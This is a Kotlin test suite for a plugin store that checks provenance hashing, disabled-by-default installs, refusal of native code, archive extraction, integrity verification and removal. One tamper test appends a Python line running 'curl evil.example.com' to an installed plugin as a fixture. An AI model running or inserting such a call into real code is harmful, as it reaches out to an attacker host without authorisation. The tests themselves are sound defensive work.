package dev.beancount.core.data

import dev.beancount.core.domain.PluginPolicy
import dev.beancount.core.domain.PluginRejection
import java.io.File
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.test.AfterTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertIs
import kotlin.test.assertTrue

/**
 * Installing a plugin: what gets written, what does not, and what the user is told later.
 *
 * The rule that shapes most of this is that a refusal must leave the store exactly as it
 * was. A half-installed package is worse than no package — it is code that loads.
 */
class PluginStoreTest {

    private val root = File(System.getProperty("java.io.tmpdir"), "pluginstore-${System.nanoTime()}")
        .apply { mkdirs() }
    private val incoming = File(root, "incoming").apply { mkdirs() }
    private val project = File(root, "project").apply { mkdirs() }
    private val store = PluginStore(project)

    @AfterTest fun cleanUp() {
        root.deleteRecursively()
    }

    private fun pyFile(name: String, body: String) =
        File(incoming, name).apply { writeText(body) }

    private fun zip(name: String, entries: Map<String, ByteArray>) =
        File(incoming, name).apply {
            ZipOutputStream(outputStream()).use { out ->
                entries.forEach { (path, bytes) ->
                    out.putNextEntry(ZipEntry(path)); out.write(bytes); out.closeEntry()
                }
            }
        }

    private val plain = "__plugins__ = ['go']\n\ndef go(entries, options_map):\n    return entries, []\n"

    @Test
    fun `an installed plugin records where it came from and what it hashed to`() {
        val file = pyFile("tidy.py", plain)

        val result = assertIs<InstallResult.Installed>(
            store.install(file, Expert, sourceLabel = "Downloads/tidy.py", now = 1_700_000_000_000),
        )

        val plugin = result.plugin
        assertEquals("tidy.py", plugin.name)
        assertEquals("Downloads/tidy.py", plugin.sourceLabel)
        assertEquals("expert", plugin.installedUnderPolicy)
        assertEquals(1_700_000_000_000, plugin.installedAtEpochMs)
        assertEquals(64, plugin.sourceSha256.length)
        assertEquals(64, plugin.installedSha256.length)
        assertEquals(listOf(plugin), store.list())
    }

    @Test
    fun `a newly installed plugin is not enabled`() {
        // Saying yes to installing is not saying yes to running. They are different
        // decisions and only one of them executes somebody else's code.
        val result = assertIs<InstallResult.Installed>(
            store.install(pyFile("tidy.py", plain), Expert, "Downloads/tidy.py"),
        )

        assertFalse(result.plugin.enabled)
        assertFalse(store.list().single().enabled)

        store.setEnabled(result.plugin.id, true)
        assertTrue(store.list().single().enabled)
    }

    @Test
    fun `the play edition refuses a native wheel and writes absolutely nothing`() {
        val wheel = zip(
            "fast-1.0.whl",
            mapOf(
                "fast/__init__.py" to "".toByteArray(),
                "fast/_core.so" to byteArrayOf(0x7f, 0x45, 0x4c, 0x46),
            ),
        )

        val refused = assertIs<InstallResult.Refused>(store.install(wheel, Play, "Downloads"))

        assertTrue(refused.verdict.reasons.any { it is PluginRejection.NativeCode })
        assertTrue(store.list().isEmpty())
        val installedDirs = File(project, "plugins").listFiles().orEmpty()
            .filter { it.isDirectory }
        assertTrue(installedDirs.isEmpty(), "a refused install left files behind: $installedDirs")
    }

    @Test
    fun `a refusal leaves an already installed plugin untouched`() {
        val good = assertIs<InstallResult.Installed>(
            store.install(pyFile("tidy.py", plain), Play, "Downloads/tidy.py"),
        )
        store.setEnabled(good.plugin.id, true)

        store.install(pyFile("bridged.py", "import java\n"), Play, "Downloads/bridged.py")

        val after = store.list()
        assertEquals(1, after.size, "the store changed on a refused install: $after")
        assertTrue(after.single().enabled, "an unrelated plugin was disabled by a refusal")
    }

    @Test
    fun `an archive is extracted, and its files are really there`() {
        val wheel = zip(
            "pkg-1.0.whl",
            mapOf(
                "pkg/__init__.py" to "from . import rules\n".toByteArray(),
                "pkg/rules.py" to plain.toByteArray(),
            ),
        )

        val installed = assertIs<InstallResult.Installed>(store.install(wheel, Play, "Downloads"))
        val dir = store.directoryFor(installed.plugin)

        assertTrue(File(dir, "pkg/__init__.py").isFile)
        assertEquals(plain, File(dir, "pkg/rules.py").readText())
        assertEquals(listOf("pkg/__init__.py", "pkg/rules.py"), installed.plugin.modules)
    }

    @Test
    fun `a plugin edited after approval is reported as changed, not run quietly`() {
        val installed = assertIs<InstallResult.Installed>(
            store.install(pyFile("tidy.py", plain), Expert, "Downloads/tidy.py"),
        )
        assertEquals(PluginIntegrity.Unchanged, store.verify(installed.plugin))

        File(store.directoryFor(installed.plugin), "tidy.py")
            .writeText(plain + "\nimport os\nos.system('curl evil.example.com')\n")

        val changed = assertIs<PluginIntegrity.Changed>(store.verify(installed.plugin))
        assertFalse(changed.nowSha256 == installed.plugin.installedSha256)
    }

    @Test
    fun `a plugin whose files have gone is reported as missing`() {
        val installed = assertIs<InstallResult.Installed>(
            store.install(pyFile("tidy.py", plain), Expert, "Downloads/tidy.py"),
        )
        store.directoryFor(installed.plugin).deleteRecursively()

        assertEquals(PluginIntegrity.Missing, store.verify(installed.plugin))
    }

    @Test
    fun `removing a plugin takes its files with it`() {
        val installed = assertIs<InstallResult.Installed>(
            store.install(pyFile("tidy.py", plain), Expert, "Downloads/tidy.py"),
        )
        val dir = store.directoryFor(installed.plugin)
        assertTrue(dir.exists())

        store.remove(installed.plugin.id)

        assertTrue(store.list().isEmpty())
        assertFalse(dir.exists(), "the files outlived the record")
    }

    @Test
    fun `the index survives a round trip through disk`() {
        store.install(pyFile("a.py", plain), Expert, "Downloads/a.py")
        store.install(pyFile("b.py", plain + "# different\n"), Expert, "Downloads/b.py")

        val reread = PluginStore(project).list()

        assertEquals(store.list(), reread)
        assertEquals(2, reread.size)
    }

    @Test
    fun `a name that is not a safe folder name becomes one`() {
        val awkward = File(incoming, "../weird name.py").let {
            File(incoming, "weird name.py").apply { writeText(plain) }
        }

        val installed = assertIs<InstallResult.Installed>(store.install(awkward, Expert, "Downloads"))

        assertFalse(installed.plugin.id.contains(" "))
        assertFalse(installed.plugin.id.contains("/"))
        assertTrue(store.directoryFor(installed.plugin).isDirectory)
    }

    @Test
    fun `installing something that is not there is reported, not crashed on`() {
        val gone = File(incoming, "vanished.py")

        val failed = assertIs<InstallResult.Failed>(store.install(gone, Expert, "Downloads"))

        assertTrue(failed.reason.isNotBlank())
    }

    private object Play : PluginPolicy {
        override val allowsUserCode = true
        override val allowsNativeCode = false
        override val allowsAndroidBridge = false
        override val allowsSelfUpdate = false
        override val allowsPackageDownload = false
        override val name = "play"
    }

    private object Expert : PluginPolicy {
        override val allowsUserCode = true
        override val allowsNativeCode = true
        override val allowsAndroidBridge = true
        override val allowsSelfUpdate = true
        override val allowsPackageDownload = true
        override val name = "expert"
    }
}
